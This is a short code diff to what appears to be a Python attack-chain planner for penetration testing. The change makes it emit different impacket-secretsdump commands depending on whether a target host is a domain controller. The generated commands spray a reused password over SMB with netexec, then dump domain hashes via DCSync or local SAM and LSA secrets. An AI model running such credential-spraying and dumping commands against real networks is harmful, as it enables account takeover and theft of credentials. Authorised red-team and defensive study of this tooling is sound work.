@@ -316,11 +316,24 @@ def run(report, store, ui=None):
                                 f"do NOT spray more attempts than {lockout - 1} per user")
             has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
             krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
+            # iter-77: same gate as R7 (iter-76) - -just-dc only works when
+            # smb IS the DC. For non-DC targets, drop -just-dc and note that
+            # the DCSync form needs a DC target.
+            _r1_prox = _prox(store, smb)
+            _r1_tgt_dc = _r1_prox >= 1.0
+            if _r1_tgt_dc:
+                _r1_dump = f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"
+                _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, then dcsync "
+                                 f"(gates the secretsdump):")
+            else:
+                _r1_dump = f"impacket-secretsdump '{disp}':'{pw}'@{smb}"
+                _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, dump local "
+                                 f"SAM + LSA cached secrets (target isn't the DC):")
             chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
-                crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
+                crit=8, conf=0.8, ready=1.5, prox=_r1_prox,
                 commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
-                          f"# AFTER confirming Pwn3d! on {smb}, then dcsync (gates the secretsdump):",
-                          f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"],
+                          _r1_dump_note,
+                          _r1_dump],
                 src=src, line=ln))
             wh = svc_on(mach, "winrm")
             if wh:
